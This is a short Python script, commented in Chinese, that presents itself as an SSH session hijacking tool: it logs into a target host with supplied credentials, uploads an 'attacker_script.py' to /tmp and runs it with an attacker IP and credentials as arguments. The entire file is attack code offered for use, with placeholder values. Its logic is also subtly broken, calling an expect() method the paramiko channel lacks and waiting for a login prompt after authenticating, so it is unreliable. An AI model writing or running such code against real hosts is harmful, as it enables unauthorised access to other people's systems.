import paramiko
import pexpect

def hijack_ssh_session(target_host, target_username, target_password, attacker_ip, attacker_username, attacker_password):
    # 創建SSH client對象
    ssh = paramiko.SSHClient()
    # 添加未知主機到認證列表
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        # 連接到目標主機
        ssh.connect(target_host, username=target_username, password=target_password)
        # 創建pexpect會話
        ssh_shell = ssh.invoke_shell()
        # 等待登入提示
        ssh_shell.expect('login:')
        # 發送目標主機用戶名
        ssh_shell.send(target_username + '\n')
        # 等待密碼提示
        ssh_shell.expect('password:')
        # 發送目標主機密碼
        ssh_shell.send(target_password + '\n')
        # 等待登入成功提示，確認登入成功
        ssh_shell.expect(' \$ ')
        # 获取攻擊者腳本並上傳至目標主機
        sftp = ssh.open_sftp()
        sftp.put("attacker_script.py", "/tmp/attacker_script.py")
        sftp.close()
        # 執行攻擊者腳本以接管SSH session
        ssh_shell.send('python /tmp/attacker_script.py --attacker_ip {} --attacker_username {} --attacker_password {}\n'.format(attacker_ip, attacker_username, attacker_password))
        ssh_shell.send('\n')
        ssh_shell.send('\n')
        ssh_shell.send('\n')
        ssh_shell.send('\n')
        ssh_shell.send('\n')
    except paramiko.AuthenticationException:
        print("Authentication failed.")
    except paramiko.SSHException as e:
        print(str(e))
    finally:
        ssh.close()

# 使用範例
target_host = "target_host_ip"
target_username = "target_username"
target_password = "target_password"
attacker_ip = "attacker_ip"
attacker_username = "attacker_username"
attacker_password = "attacker_password"

hijack_ssh_session(target_host, target_username, target_password, attacker_ip, attacker_username, attacker_password)